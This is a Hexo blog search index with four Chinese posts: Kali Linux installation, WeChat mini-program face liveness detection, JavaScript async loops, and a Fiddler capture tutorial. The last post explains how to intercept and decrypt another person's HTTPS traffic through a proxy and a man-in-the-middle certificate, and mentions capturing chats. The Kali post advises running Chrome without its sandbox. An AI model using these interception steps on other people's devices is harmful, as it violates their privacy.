<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>关于kali linux的安装教程踩坑建议</title>
      <link href="/2019/08/29/kalilinux/"/>
      <url>/2019/08/29/kalilinux/</url>
      
        <content type="html"><![CDATA[<h1 id="关于kali-linux的安装教程踩坑建议"><a href="#关于kali-linux的安装教程踩坑建议" class="headerlink" title="关于kali linux的安装教程踩坑建议"></a>关于kali linux的安装教程踩坑建议</h1><blockquote><p>&emsp;&emsp;关于kali linux的u盘物理机安装教程网上信息很少,所以博主在此开个教程贴记录一下博主所遇到的困难。</p></blockquote><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>&emsp;&emsp;对于kali linux的用途和重要性这里就不需要再多次阐述了,对于网络编程网络攻防网络安全都具有非常重要的意义。</p><h1 id="安装过程"><a href="#安装过程" class="headerlink" title="安装过程"></a>安装过程</h1><h2 id="第一步-下载kali-linux-镜像iso文件"><a href="#第一步-下载kali-linux-镜像iso文件" class="headerlink" title="第一步 下载kali linux 镜像iso文件"></a>第一步 下载kali linux 镜像iso文件</h2><p>&emsp;&emsp;点击kali linux官网下载,官网有好几个版本,简化版,标准版,剩下的四个版本都是打包的不同的gui界面系统,mate,kde。这里博主下载的是kde桌面版的kali linux。同时下载<a href="https://www.kali.org/downloads/" target="_blank" rel="noopener">kali官网</a>推荐的u盘启动制作工具<a href="https://en.softonic.com/download/universal-usb-installer/windows/post-download" target="_blank" rel="noopener">Universal-USB-Installer-1.9.8.8</a></p><p> <img src="/2019/08/29/kalilinux/1.png" alt="版本下载"></p><h2 id="第二步-制作u盘启动"><a href="#第二步-制作u盘启动" class="headerlink" title="第二步  制作u盘启动"></a>第二步  制作u盘启动</h2><p>&emsp;&emsp;将iso镜像文件导入到Universal-USB-Installer-1.9.8.8工具中制作中制作u盘启动盘。</p>  <strong>&emsp;&emsp;注意：这里u盘将会被分区,使用并隐藏部分空间用作引导系统,所以会出现u盘容量就算格式化后也不会达到原来的容量,若你想恢复到原来的容量就可以使用DiskGenius工具删除分区恢复到原来容量。 </strong><h2 id="第三步-修改电脑启动项"><a href="#第三步-修改电脑启动项" class="headerlink" title="第三步 修改电脑启动项"></a>第三步 修改电脑启动项</h2>  <p>&emsp;&emsp;如果你的电脑是win10系统,就可以 win+x 在在安全与更新中找到恢复,在恢复中找到高级设置,选择重启。如果不是win10系统,那么请在网上搜索对应的进入bios系统的文章,一般来讲都是在开机启动时不停按住f12键</p>  <p>&emsp;&emsp;重启之后在设置里面,进入到bios设置中。</p>  <p>&emsp;&emsp;在bios中更改启动项,修改为usb启动项,详细请百度自己主板的型号,不同主板的设置略有不同。</p><h2 id="第四步-安装"><a href="#第四步-安装" class="headerlink" title="第四步 安装"></a>第四步 安装</h2>  <p>&emsp;&emsp;将u盘插入到电脑上,电脑重启中u盘引导系统打开kali linux安装界面,选择grapical install安装,也可以选择install,两者的区别是一个是图形界面安装一个是文字界面安装,安装后的区别是一样的。</p>  <p>&emsp;&emsp;注意：如果你用的是大白菜或者Win32DiskImager工具制作的u盘启动盘,大白菜pe系统会提醒你解压后再安装,但解压后会找不到gho文件,如果你用的是Win32DiskImager工具,使用grapical install会导致黑屏,却可以使用install文字界面安装,博主暂时不清楚文字界面安装是否可以成功。(博主没有试过老毛桃制作,暂时不太清楚,但是网上有人说老毛桃安装也不会成功。)</p><p>&emsp;&emsp;安装完成后就可以进入系统了,注意的是最后一步安装GRUB时,必须选择我们安装系统的那块硬盘,格式是 /dev/ 开头,否则会出现安装后启动黑屏的情况。</p><h2 id="第五步-基础设置"><a href="#第五步-基础设置" class="headerlink" title="第五步 基础设置"></a>第五步 基础设置</h2><h3 id="更改更新源网址"><a href="#更改更新源网址" class="headerlink" title="更改更新源网址"></a>更改更新源网址</h3><p>&emsp;&emsp;因为下载源的本地地址是在/etc/apt/sources.list,所以我们先打开终端输入cd /etc/apt 进入文件,pwd是查看当前路径,然后ls是查看当前路劲下的所有文件,然后我们输入 leafpad sources.list,表示用leafpad(系统自带文本编辑器)打开sources.list,然后我们可以百度地址源复制进文件中,保存退出。然后在终端输入</p><pre><code>apt-get update //更新源ape-get upgrade //更新软件apt-get dist-upgrade //更新系统 //清除安装包apt-get clean apt-get autoclean </code></pre><p><img src="/2019/08/29/kalilinux/2.png" alt="更新下载源"></p><h3 id="安装google浏览器"><a href="#安装google浏览器" class="headerlink" title="安装google浏览器"></a>安装google浏览器</h3><p>&emsp;&emsp;在终端中输入指令</p><pre><code>wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb</code></pre> <p>&emsp;&emsp;将下载的文件包解压安装</p><pre><code>dpkg -i google-chrome-stable_*.deb    </code></pre><p>&emsp;&emsp;此时会因为缺少依赖包报错,修复安装</p><pre><code>apt-get -f install</code></pre><p>&emsp;&emsp;安装谷歌浏览器依赖包</p><pre><code>apt-get install google-chrome-stable</code></pre><p>&emsp;&emsp;重新解压安装</p><pre><code>dpkg -i google-chrome-stable_*.deb    </code></pre><p>&emsp;&emsp;然后我们点击谷歌图标打开浏览器,发现没有反应。<br><br>&emsp;&emsp;怎么办？别慌！<br><br>&emsp;&emsp;我们安装完成以后需要修改 /user/share/applications 桌面图标文件 .desktop,</p><p>&emsp;&emsp;用图形界面打开 /user/share/applications 找到谷歌浏览器图标,右击查看属性。</p><p>&emsp;&emsp;将： </p><pre><code>/usr/bin/google-chrome-stable %U</code></pre><p>&emsp;&emsp;替换为：</p><pre><code>/usr/bin/google-chrome --no-sandbox --user-data-dir</code></pre><p>&emsp;&emsp;再点击图标就能顺利打开谷歌浏览器了。</p><p>   &emsp;&emsp;注意:用终端打开google浏览器的命令是 </p><pre><code>google-chrome-stable --no-sandbox</code></pre><h3 id="安装搜狗输入法"><a href="#安装搜狗输入法" class="headerlink" title="安装搜狗输入法"></a>安装搜狗输入法</h3><p>&emsp;&emsp;百度即可,这里推荐一个网址<a href="https://blog.csdn.net/qq_39338006/article/details/80659853" target="_blank" rel="noopener">点击即可</a></p><h3 id="安装截屏scrot"><a href="#安装截屏scrot" class="headerlink" title="安装截屏scrot"></a>安装截屏scrot</h3><p>&emsp;&emsp;输入指令 apt-get install scrot</p><p><img src="/2019/08/29/kalilinux/3.png" alt="安装scrot"></p><p>&emsp;&emsp;主要指令:</p><pre><code>scrot   // 截取整个桌面scrot /root/Pictures/l.png  // 指定保存目标文件夹和截图文件名(默认保存当前目录下)scrot -s   // 截取特定窗口或矩形区域 </code></pre><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1>   <p>&emsp;&emsp;有时更新</p>]]></content>
      
      
      <categories>
          
          <category> 网络原理 </category>
          
          <category> kali </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络编程 </tag>
            
            <tag> kali </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小程序人脸动态识别摇头点头采坑建议</title>
      <link href="/2019/08/23/BaiDuface/"/>
      <url>/2019/08/23/BaiDuface/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote><p>&emsp;&emsp;应需求,在小程序内部弄一个人脸动态活体扫描,检测一下摇摇头,点点头之类的。但是在网上的相关信息却没有,偶尔有几个思路,所以就在这里记录下自己的探究历程</p></blockquote><h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><p>&emsp;&emsp;首先说明的是这篇文章采用的是百度云的人脸识别,与腾讯的人脸识别不同的是,百度人脸识别的api还提供三维旋转的角度检测,这样对于实现检测人脸识别摇头和点头是非常简单的。</p><p><img src="/2019/08/23/BaiDuface/first.png" alt="百度云人脸识别接口说明"></p><h1 id="探究"><a href="#探究" class="headerlink" title="探究"></a>探究</h1><h2 id="实现思路"><a href="#实现思路" class="headerlink" title="实现思路"></a>实现思路</h2><p>&emsp;&emsp;创造一个定时器,在定时器里面使用拍照之后使用人脸识别接口,这样就变成动态检测了。</p><h3 id="定时器"><a href="#定时器" class="headerlink" title="定时器"></a>定时器</h3><h4 id="setTimeout和setInterval区别及选择"><a href="#setTimeout和setInterval区别及选择" class="headerlink" title="setTimeout和setInterval区别及选择"></a>setTimeout和setInterval区别及选择</h4>  <p>&emsp;&emsp;setTimeout和setInterval都可以用作定时器,但是我们得先大致区分一下两者的部分区别:</p><blockquote><p>&emsp;&emsp;setTimeout会保证在指定好的延时时间后执行,但是setInterval则不会这样。 如果function中的代码有耗时载操作,那么使用setTimeout方法递归,则可能会增加总递归的时间。 <br><br>&emsp;&emsp;而使用setInterval方法,如果程序中耗时比延时间隔长,则会立刻回调函数。( 更多关于setInterval计时不准确可以点击<a href="https://www.zhihu.com/question/20479535" target="_blank" rel="noopener">这里</a>了解。)</p></blockquote><p>&emsp;&emsp;因为setInterval计时并不准确,同时我们定时器同时存在耗时操作(调用百度云接口),所以我们这里就采用setTimeout +递归方式来实现定时。</p><h4 id="定时器代码"><a href="#定时器代码" class="headerlink" title="定时器代码"></a>定时器代码</h4><pre><code>every_camera_upload: function(acstoken) { //定时拍摄照片let that = this;timer = setTimeout(function() {//设置定时器,并赋给全局变量timer //that.camera().then(resx =&gt; {//循环拍照     // that.uploadBaiDuPicture(acstoken).then(rx =&gt;{//上传百度云接口     // that.judge_face(rx);//获取返回的json数据并分析   // });    that.every_camera_upload(that.data.getAccessToken); //方法中调用定时器实现循环//  });}, 1500);}//clearTimeout(timer); //此方法不能放在定时器方法内部,//用于清除新一轮循环中函数还未运行时清除定时器,//也不能放在every_camera_upload()方法内部,应为要重复调用,应放于其他方法内部。</code></pre><p>&emsp;&emsp;解释一下代码,在方法内部,设置一个setTimeout赋给全局变量,在定时器内部调用camer方法,之后则重复调用every_camera_upload()方法实现递归。clearTimeout()的作用用于清除循环,必须在其他方法中使用。</p><h2 id="实现功能过程"><a href="#实现功能过程" class="headerlink" title="实现功能过程"></a>实现功能过程</h2><h3 id="获取accessToken"><a href="#获取accessToken" class="headerlink" title="获取accessToken"></a>获取accessToken</h3><p>&emsp;&emsp;阅读百度云人脸识别接口得知,先获取access_token进行身份验证,但我们不能将密钥密匙放在客户端上防止别人抓包逆工程获取到,此时可以将其放在服务器或者使用云开发的云函数上(博主使用的云函数)</p><h4 id="云函数代码"><a href="#云函数代码" class="headerlink" title="云函数代码"></a>云函数代码</h4><pre><code>// 云函数入口文件 const cloud = require(&apos;wx-server-sdk&apos;); cloud.init();// 云函数入口函数var getAccessToken = function () { //人脸识别APIvar https = require(&apos;https&apos;);var qs = require(&apos;querystring&apos;);const param = qs.stringify({&apos;grant_type&apos;: &apos;client_credentials&apos;,&apos;client_id&apos;: &apos;你的 Api Key&apos;,&apos;client_secret&apos;: &apos;你的 Secret Key&apos;});var access_token;return new Promise((resolve,reject) =&gt; { let body =[];https.get({  hostname: &apos;aip.baidubce.com&apos;,  path: &apos;/oauth/2.0/token?&apos; + param,  agent: false},function (res) {  res.on(&apos;data&apos;,(chunk) =&gt; {    body.push(chunk);  });   res.on(&apos;end&apos;, () =&gt;{    let data = Buffer.concat(body).toString();    let getData = JSON.parse(data);     access_token = getData.access_token;    console.log(access_token);    resolve(access_token);  });     } );}).then(res =&gt;{return access_token;});}exports.main = (event, context) =&gt; { let datas = getAccessToken();  return datas;}</code></pre><h4 id="小程序端代码"><a href="#小程序端代码" class="headerlink" title="小程序端代码"></a>小程序端代码</h4><pre><code>getAccessToken: function() { //获取accesstoken var x = new Promise((resolve, reject) =&gt; {  wx.cloud.callFunction({    name: &apos;getBaiDuAccessToken&apos;,    data: {},    success: resy =&gt; {      console.log(resy);      console.log(resy.result);      resolve(resy.result);    },    fail: resy =&gt; {      wx.showToast({        title: &apos;accesstoken报错&apos;,        icon: &apos;none&apos;,        duration: 2000      });    }  });});return x; }</code></pre><h3 id="开始定时循环拍摄"><a href="#开始定时循环拍摄" class="headerlink" title="开始定时循环拍摄"></a>开始定时循环拍摄</h3><p>&emsp;&emsp;获取到access_token后,就可以在小程序循环拍摄上传了,但注意的是access_token最好放在服务器上让小程序将照片发送到后端让后端发送请求接口,但考虑到诸多性能问题,博主就将其放在小程序端上。</p><h4 id="循环拍照"><a href="#循环拍照" class="headerlink" title="循环拍照"></a>循环拍照</h4><pre><code>every_camera_upload: function(acstoken) { //定时拍摄照片  let that = this; timer = setTimeout(function() {  that.camera().then(resx =&gt; {    that.uploadBaiDuPicture(acstoken).then(rx =&gt;{      that.judge_face(rx);    });    that.every_camera_upload(that.data.getAccessToken); //方法中调用定时器实现循环  });}, 1500);</code></pre><h3 id="发送请求"><a href="#发送请求" class="headerlink" title="发送请求"></a>发送请求</h3><p>&emsp;&emsp;发送请求最好由服务器来做,服务器解析之后返回给小程序端,博主将其放在小程序端。</p><pre><code>uploadBaiDuPicture: function(restoken) { //上传百度云照片并解析  var base64 = wx.getFileSystemManager().readFileSync(this.data.tempImagePath, &apos;base64&apos;);  let data = [{ //百度云的锅,在json格式外需要外加一个[]    image: base64,    image_type: &apos;BASE64&apos; }];return new Promise((resolve, reject) =&gt; {  wx.request({    url: &apos;https://aip.baidubce.com/rest/2.0/face/v3/faceverify?access_token=&apos; + restoken,    data: data,    // dataType: &quot;json&quot;,    method: &apos;POST&apos;,    header: {      &apos;Content-Type&apos;: &apos;application/json&apos;    },    success(res) {      resolve(res);    }  })});}</code></pre> <p>&emsp;&emsp;由于拍摄的照片是在本地上,发送请求就必须将本地照片进行base64编码后放入data请求参数中,特别重要的一点,如果你碰上这种错误返回:</p>   <p> <img src="/2019/08/23/BaiDuface/second.png" alt="接口返回错误222200"></p> <p>&emsp;&emsp;那八成是由于请求参数外没有加 [ ],如上代码显示,json请求格式外要 [] ,这个错误网上信息很少,解释为百度人脸识别v3版本的api表单是个list,接口开发文档也没有相关注明,所以请注意这个坑,引用:<a href="https://ai.baidu.com/forum/topic/show/870349" target="_blank" rel="noopener">活体检测error_code&quot;:222200&quot;</a></p><h3 id="摇头点头顺序设置"><a href="#摇头点头顺序设置" class="headerlink" title="摇头点头顺序设置"></a>摇头点头顺序设置</h3><pre><code>judge_face: function(res) { //判断用户点头摇头动作    let that = this;if (res.data.error_code == 0) {  if (this.data.prove_face_front == false){    that.judge_prove_face_front(res);  }else if (that.data.judge_left_change_right_head_count &lt; 2) {    that.judge_left_change_right_head(res); //判断用户摇头  } else if(that.data.judge_down_to_up_head_count &lt; 2){    that.judge_down_to_up_head(res); //判断用户点头  }else {    wx.showLoading({      title: &apos;上传中&apos;,    });    innerAudioConext.src = &quot;/music/upload.mp3&quot;    innerAudioConext.play();    this.uploadUserPictureProve();    clearTimeout(timer);  }} else if (res.data.error_code == 222202) {  wx.showToast({    title: &apos;未识别到脸部&apos;,    icon: &apos;none&apos;,    duration: 500  });} else {  wx.showToast({    title: &apos;未知错误&apos;,    icon: &apos;none&apos;,    duration: 500  });}</code></pre><p>  }</p><h3 id="解析返回json文件"><a href="#解析返回json文件" class="headerlink" title="解析返回json文件"></a>解析返回json文件</h3> <p>&emsp;&emsp;获取返回的json的参数pitch,yaw,为三维旋转角度,以此判断正脸</p><pre><code>judge_prove_face_front:function(res){  let pitch = Math.abs(res.data.result.face_list[0].angle.pitch);  let yaw = Math.abs(res.data.result.face_list[0].angle.yaw);  if ((pitch &lt; 5 ) &amp;&amp; (yaw&lt;5)) {  let font_face=this.data.tempImagePath  this.setData({    prove_face_front: true,    save_font_face:font_face  })} else {  wx.showToast({    title: &apos;未检测到正脸&apos;,    icon: &apos;none&apos;,    duration: 1000  });}}</code></pre> <p>&emsp;&emsp;播放语音,获取返回的json的参数yaw,用上一次获取的yaw减去这一次的yaw参数的绝对值判断是否摇头。</p><pre><code>judge_left_change_right_head: function(res) {   if (this.data.music_count == 0) {     innerAudioConext.src = &quot;/music/leftright.mp3&quot;     innerAudioConext.play();     this.data.music_count++;}let yaw = parseInt(res.data.result.face_list[0].angle.yaw);if ((yaw &lt; 0 || yaw &gt; 0) &amp;&amp; (Math.abs(this.data.last_yaw - yaw)&gt;40)) {  this.data.judge_left_change_right_head_count++;  this.setData({    last_yaw: yaw  })  console.log(&quot;摇头 &quot; + this.data.judge_left_change_right_head_count)} else {  console.log(&quot;yaoyaoyoa  &quot; + parseInt(this.data.last_yaw - yaw));  console.log(&quot;yaoyaoyoa  &quot; + typeof (res.data.result.face_list[0].angle.yaw));  wx.showToast({    title: &apos;未检测到摇头&apos;,    icon: &apos;none&apos;,    duration: 1000  });}}</code></pre> <p>&emsp;&emsp;播放语音,获取返回的json的参数pitch,用上一次获取的pitch减去这一次的pitch参数的绝对值判断是否点头。</p><pre><code>judge_down_to_up_head: function(res) {if(this.data.music_count==1){  innerAudioConext.src = &quot;/music/headupdown.mp3&quot;  innerAudioConext.play();  this.data.music_count++;}let pitch = res.data.result.face_list[0].angle.pitch;if ((pitch &lt; 0 || pitch &gt; 0) &amp;&amp; (Math.abs(this.data.last_pitch - pitch) &gt; 5.5)) {  this.data.judge_down_to_up_head_count++;  this.setData({    last_pitch: pitch  })  //console.log(&quot;点头 &quot; + this.data.judge_down_to_up_head_count)} else { // console.log(&quot;点头 &quot; + this.data.judge_down_to_up_head_count) // console.log(&quot;点头ssssssssss &quot; + Math.abs(this.data.last_pitch - pitch))  wx.showToast({    title: &apos;未检测到点头&apos;,    icon: &apos;none&apos;,    duration: 1000  });}}</code></pre><h3 id="人脸对比"><a href="#人脸对比" class="headerlink" title="人脸对比"></a>人脸对比</h3>   <p>&emsp;&emsp;所有验证成功后,就可以直接上传人脸对比了,关于人脸对比同样使用静默人脸对比,由于源码解释众多,本篇文章就不再重复讲解了。</p><h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1>   <p>&emsp;&emsp;只看开发者文档注定会踩许多坑,希望能将有坑的地方记录下来,让更多人注意。感谢其他文章论坛提问的帮助,链接如下：<br>&emsp;&emsp;<a href>微信小程序—setTimeOut定时器的坑</a><br>&emsp;&emsp;<a href="https://ai.baidu.com/forum/topic/show/870349" target="_blank" rel="noopener">活体检测error_code&quot;:222200&quot;</a></p>]]></content>
      
      
      <categories>
          
          <category> 编程平台 </category>
          
          <category> 微信小程序 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 微信小程序 </tag>
            
            <tag> javascript </tag>
            
            <tag> 人脸识别 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微信小程序循环同步请求踩坑指南</title>
      <link href="/2019/08/13/Mini-Program/"/>
      <url>/2019/08/13/Mini-Program/</url>
      
        <content type="html"><![CDATA[<h1 id="微信小程序循环同步请求踩坑指南"><a href="#微信小程序循环同步请求踩坑指南" class="headerlink" title="微信小程序循环同步请求踩坑指南"></a>微信小程序循环同步请求踩坑指南</h1><br><blockquote><p>&emsp;&emsp;最近做微信小程序校园失物巡回箱的时候需要完成一个逻辑就是用循环while/for 来不断向云数据库发送读写请求，有感而写，希望能给你启发。</p></blockquote><br><h2 id="问题阐述"><a href="#问题阐述" class="headerlink" title="问题阐述"></a>问题阐述</h2><p>&emsp;&emsp;关于不断循环发送请求这一点，由于发送请求本是耗时操作，本意打算用promise来将异步变成同步，但试过之后发现循环只运行一次，原因尚不清楚。可能是由于js的线程堵塞机制引发的阻塞问题，</p><h2 id="展示代码"><a href="#展示代码" class="headerlink" title="展示代码"></a>展示代码</h2><h3 id="promse请求"><a href="#promse请求" class="headerlink" title="promse请求"></a>promse请求</h3><p>故障:只能运行一次</p><pre><code>onLoad:function(){  for (let i=0;i&lt;9;i++){     return new Promise((resolve,reject) =&gt;{            //执行代码成功            resolve();            //执行代码失败            reject();     }).then(res =&gt;{});   }}</code></pre><h3 id="async-await请求"><a href="#async-await请求" class="headerlink" title="async await请求"></a>async await请求</h3><p>解决只能与逆行一次的问题</p><pre><code> async onLoad(){  for(let i=0;i&lt;9;i++){      await new Promise((resolve,reject) =&gt;{            //执行代码成功            resolve();            //执行代码失败            reject();     }).then(res =&gt;{});  }}</code></pre><h2 id="js阻塞机制"><a href="#js阻塞机制" class="headerlink" title="js阻塞机制"></a>js阻塞机制</h2><h3 id="阻塞机制解释"><a href="#阻塞机制解释" class="headerlink" title="阻塞机制解释"></a>阻塞机制解释</h3><p>&emsp;&emsp;JavaScript是单线程执行的，无法同时执行多段代码。当某一段代码正在执行的时候，所有后续的任务都必须等待，形成一个队列。一旦当前任务执行完毕，再从队列中取出下一个任务，这也常被称为 “阻塞式执行”。所以一次鼠标点击，或是计时器到达时间点，或是Ajax请求完成触发了回调函数，这些事件处理程序或回调函数都不会立即运行，而是立即排队，一旦线程有空闲就执行。<br>&emsp;&emsp;关键说明：假如当前 JavaScript线程正在执行一段很耗时的代码，此时发生了一次鼠标点击，那么事件处理程序就被阻塞，用户也无法立即看到反馈，事件处理程序会被放入任务队列，直到前面的代码结束以后才会开始执行。如果代码中设定了一个 setTimeout，那么浏览器便会在合适的时间，将代码插入任务队列，如果这个时间设为 0，就代表立即插入队列，但不是立即执行，仍然要等待前面代码执行完毕。所以 setTimeout 并不能保证执行的时间，是否及时执行取决于 JavaScript 线程是拥挤还是空闲。</p><p>&emsp;&emsp;js阻塞机制，跟Js引擎的单线程处理方式有关，每个window一个JS线程。所谓单线程，在某个特定的时刻只有特定的代码能够被执行，并阻塞其它的代码。</p>以下给个示例:<pre><code>for(var i=0;i&lt;3;i++){  setTimeout(function(){      console.log(i);                  }, (i+1)*1000); }</code></pre><p>&emsp;&emsp;一般，我们会认为，这段代码会log出来0,1,2.而实际上，这段代码log出来的结果是 3,3,3。具体原因就是因为for循环的阻塞机制。在上面的代码中，setTimeout这个定时器需要等待for循环 执行完成，而for循环执行完成了之后，i已经为3了，此时才开始执行setTimeout，因此console.log(i)会是3。至于为什么i会是3,当i为2的时候，满足循环条件，执行代码块，然后i++，此时i为3，不满足循环条件，不执行代码块，循环停止。</p><h3 id="阻塞机制解决办法"><a href="#阻塞机制解决办法" class="headerlink" title="阻塞机制解决办法"></a>阻塞机制解决办法</h3><p>&emsp;&emsp;其实，阻塞作为js引擎的处理方式，我们最好不要想着解决“阻塞”，而是让我们想执行的代码，插入到“主线程”中。这么说比较不易理解，还是以上面的代码为例，直接上代码好了</p><pre><code>for(var i=0;i&lt;3;i++){  (function(i){      setTimeout(function(){        console.log(i);          }, (i+1)*1000);      })(i) }</code></pre><p>&emsp;&emsp;在上面的代码中，我们加了一个立即执行的匿名函数，并且将for循环的i作为实参传入进去。这样，setTimeout就会被立即执行，而不会等待（这里不太了解细节，就不多说了，大概猜测为新开了一个临时的线程，立即执行匿名函数，然后再立即切换回来）。</p><p>注意：顺带提一下，html5支持Web worker功能，可以写多线程，小程序同样可以用worker功能。</p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>&emsp;&emsp;本篇文章引用的文章链接如下，感谢他们的帮助:</p>&emsp;&emsp; <a href="https://blog.csdn.net/rangwotongxing34/article/details/79378790" target="_blank" rel="noopener">JavaScript的单线程与阻塞式执行（附案例）</a><p>&emsp;&emsp; <a href="https://www.cnblogs.com/hq233/p/8042995.html" target="_blank" rel="noopener">Js中for循环的阻塞机制</a></p>]]></content>
      
      
      <categories>
          
          <category> 编程平台 </category>
          
          <category> 微信小程序 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 微信小程序 </tag>
            
            <tag> javascript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一个简单的监听设备上网教程(fiddler抓包)</title>
      <link href="/2019/08/06/get-talk/"/>
      <url>/2019/08/06/get-talk/</url>
      
        <content type="html"><![CDATA[<h1 id="一个简单的监听设备上网教程"><a href="#一个简单的监听设备上网教程" class="headerlink" title="一个简单的监听设备上网教程"></a>一个简单的监听设备上网教程</h1><blockquote><p>&emsp;&emsp;由于网络诈骗盗号层出不穷，谣言止于智者，所以给大家开始普及网络攻防安全。先从最基础的网络说起，这是第一版教程，之后回陆续介绍一下其他的方法。</p></blockquote><br><h2 id="责任申明"><a href="#责任申明" class="headerlink" title="责任申明"></a>责任申明</h2><p>&emsp;&emsp;本篇博客原创仅供学习交流使用，如用作其他用途所承受的法律责任一概与作者无关。</p><h2 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h2><p> &emsp;&emsp;由于是最初教程，首先给大家大致普及一下互联网的通讯，从广泛的http通讯说起吧。</p><blockquote><p>&emsp;&emsp;你通过wifi连接电脑上网浏览网址，通过一个域名搜索一个网站，首先是电脑查看host里面是否存在之前解析的ip(如果你之前访问过该网站的话),如果不存在，则dns解析域名获取服务端的ip地址，之后把访问请求通过层次关系后传给路由(网关)，路由根据ip地址查看自身的路由表（静态路由表和动态路由表），通过点对点法则（和交换机的广播不同，广播是一对多）将请求发送给该路由已知的下一个路由（局部最优路径），之后下一个路由也根据路由表转发该请求，直到传到目的ip地址。服务端接到请求后，根据你发送的请求将固定的页面按同样的方法发送给你。</p></blockquote><h2 id="开始教程"><a href="#开始教程" class="headerlink" title="开始教程"></a>开始教程</h2><p> 前提条件：<br><br>&emsp;&emsp;你和你要监听对象是连在同一个网络中的(比如: wifi网络).<br>&emsp;&emsp;此处笔者模拟的是在手机连在电脑的一个热点下电脑端监听聊天.(注:如果是统一wifi下，你可以登录家庭路由器的网址在路由设置里面更改代理(部分路由器可能没有端口镜像或端口监控功能),代理所填写的ip是你抓取别人上网数据的设备的ip，如果没有路由器代理功能，手机上wifi模式下长按连接的wifi选择高级选项，在里面填写代理和监听端口.<br>  <br></p><h2 id="第一步-下载fiddler"><a href="#第一步-下载fiddler" class="headerlink" title="第一步 下载fiddler"></a>第一步 下载fiddler</h2><p>  &emsp;&emsp;在百度上搜索fiddler下载，<a href="https://www.baidu.com/link?url=PNiuANjLE32GLkoC_yZd4JC2ugEFhvLsD_GUQ_66oYV5IfotNo3uR5sb6eiSrvcP&wd=&eqid=d4505bdf00123fd3000000065d4bb5f4" target="_blank" rel="noopener">fiddler官网</a> <br><br>  &emsp;&emsp;下载完成之后打开<br>  &emsp;&emsp;界面是这样的：<br>  <img src="/2019/08/06/get-talk/1.png" alt="fiddler界面截图"></p><h2 id="第二步-设置抓包选项"><a href="#第二步-设置抓包选项" class="headerlink" title="第二步 设置抓包选项"></a>第二步 设置抓包选项</h2><p>   &emsp;&emsp;在主界面左上角tools选择options界面 </p><p>   <img src="/2019/08/06/get-talk/2.png" alt="options界面"><br><br><br>   &emsp;&emsp;按照如图更改：<br>   <br><br>    <img src="/2019/08/06/get-talk/3.png" alt="更改HTTPS设置"><br>    <br><br>&emsp;&emsp;解释：<br>    &emsp;&emsp;因为fiddler默认只会抓取http协议的请求数据，所以我们选择Capture HTTPS CONNECTs(捕获HTTPS连接),意思是可以捕获https的请求数据会在主界面显示<br><br><br>    <img src="/2019/08/06/get-talk/4.png" alt="更改Connections设置"><br>    <br><br>     &emsp;&emsp;Decrypt HTTPS traffic(解密HTTPS通信),https是加密传输，我们fiddler只有使用中间人攻击才能破译对方上网的数据。</p><blockquote><p>from all processes:来自所有进程<br>  from browsers only:仅从浏览器<br>  from non-browsers only:仅从非浏览器<br>  from remote clients only:仅从远程客户端  </p></blockquote><p>  &emsp;&emsp;如果我们想抓取对方的上网信息，不抓取本地我们自己的上网信息，就可以选择from remote clients only，这样就不会抓到我们自己的数据包了。<br>  &emsp;&emsp;不建议勾选 check for certificate revocation(检查证书是否过期)</p><p>  &emsp;&emsp;非必选：然后选择右方的Actions，选择把证书下载到桌面上。之后需要用。<br>   <br><br>  <img src="/2019/08/06/get-talk/5.png" alt="监听端口设置"><br>  &emsp;&emsp;选择监听端口为8888，选中allow remote computers to connect.</p><h2 id="第三步-手机端配置"><a href="#第三步-手机端配置" class="headerlink" title="第三步 手机端配置"></a>第三步 手机端配置</h2><p> &emsp;&emsp;长按所选wlan<br>   <br></p><p><img src="/2019/08/06/get-talk/6.png" alt="连接wlan"></p><p><img src="/2019/08/06/get-talk/7.png" alt="修改网络"><br> <br><br>&emsp;&emsp;选择修改网络，选中高级设置<br>&emsp;&emsp;代理主机地址之后填写，先填写我们最开始设置的端口号8888<br> <br><br><img src="/2019/08/06/get-talk/8.png" alt="设置代理端口"><br><br><br>&emsp;&emsp;同时，电脑端win+R弹出运行框，输入cmd确定后，在dos界面输入ipconfig，找到如下：<br><br><br> <img src="/2019/08/06/get-talk/9.png" alt="查找代理主机ip"></p><p>&emsp;&emsp;这里的ipv4地址就是手机端要输入的代理主机的地址(内网地址)<br>&emsp;&emsp;之后手机连接电脑：</p><p><img src="/2019/08/06/get-talk/10.png" alt="成功连接"></p><h2 id="第四步-安装CA证书"><a href="#第四步-安装CA证书" class="headerlink" title="第四步 安装CA证书"></a>第四步 安装CA证书</h2><p>&emsp;&emsp;手机打开浏览器，搜索格式为 <strong>你刚刚在手机端填写的代理主机地址</strong>:8888,出现如下界面就证明你离成功就差一步了<br> <img src="/2019/08/06/get-talk/11.png" alt="手机界面"><br> &emsp;&emsp;点击下载FiddlerRoot certificate ，然后安装证书即可。（某些手机可能无法直接安装，需要在设置里面找到用户信任凭证或者证书下安装才可）</p><p> &emsp;&emsp;现在我们再打开fiddler，手机端浏览<a href="github.com">github官网</a>，fiddler抓包效果：</p><p> <img src="/2019/08/06/get-talk/12.png" alt="fiddler抓包"></p><h2 id="最后一点"><a href="#最后一点" class="headerlink" title="最后一点"></a>最后一点</h2>  <p>&emsp;&emsp;关于fiddler抓包qq，微信聊天记录，fiddler只能抓取http/https协议的通信，如果上面没有显示则证明qq微信用的其他通信协议，那么就要去学习其他的抓包软件，如强大且复杂的Wireshark根据自己的理解慎重选择学习。</p>]]></content>
      
      
      <categories>
          
          <category> 网络原理 </category>
          
          <category> 抓包 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 抓包 </tag>
            
            <tag> fiddler </tag>
            
            <tag> 网络原理 </tag>
            
